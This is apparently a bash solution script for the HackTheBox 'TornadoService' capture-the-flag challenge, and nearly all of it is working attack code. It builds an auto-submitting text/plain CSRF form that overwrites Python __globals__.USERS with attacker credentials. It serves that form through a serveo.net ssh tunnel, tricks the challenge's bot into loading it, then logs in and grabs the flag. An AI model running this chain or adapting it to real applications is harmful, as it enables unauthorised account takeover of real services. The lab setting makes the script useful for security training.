#!/bin/bash
# https://app.hackthebox.com/challenges/TornadoService
# Tags: Cross Site Request Forgery, CSRF, Python, __globals__ manipulation

TARGET=127.0.0.1:1337

echo -e "[\u2714] Preparing __globals__.USERS overwrite payload"
MACHINE_ID=$(curl -s http://$TARGET/get_tornados | jq -r .[0].machine_id)
cat <<EOF> overwrite_users.html
<body onload="document.forms[0].submit()">
    <form id="autoSubmitForm" action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
        <input type="hidden" name='{"test":"value'' value='","machine_id":"$MACHINE_ID","serialize":{"__globals__":{"USERS":[{"username":"user","password":"pass"}]}}}'>
    </form>
</body>
EOF
nohup python3 -m http.server >/dev/null 2>&1 &
echo $! > http.pid

echo -e "[\u2714] Digging tunnel with serveo.net"
nohup ssh -R 80:localhost:8000 serveo.net > serveo.log 2>&1 &
echo $! > serveo.pid
sleep 3
SERVER=$(grep -oP 'https://\K[a-zA-Z0-9]+\.serveo\.net' serveo.log)

echo -e "[\u2714] Overwriting __globals__.USERS with CSRF"
curl -s http://$TARGET/report_tornado?ip=$SERVER/overwrite_users.html%23 -o /dev/null
sleep 5
echo -e "[\u2714] Capturing flag with forged credentials"
curl -s -c cookies.txt http://$TARGET/login -d '{"username":"user","password":"pass"}' -o /dev/null
FLAG=$(curl -s -b cookies.txt http://$TARGET/stats | jq -r .success.message)
echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"

kill $(cat http.pid)
kill $(cat serveo.pid)
rm http.pid overwrite_users.html serveo.pid serveo.log cookies.txt

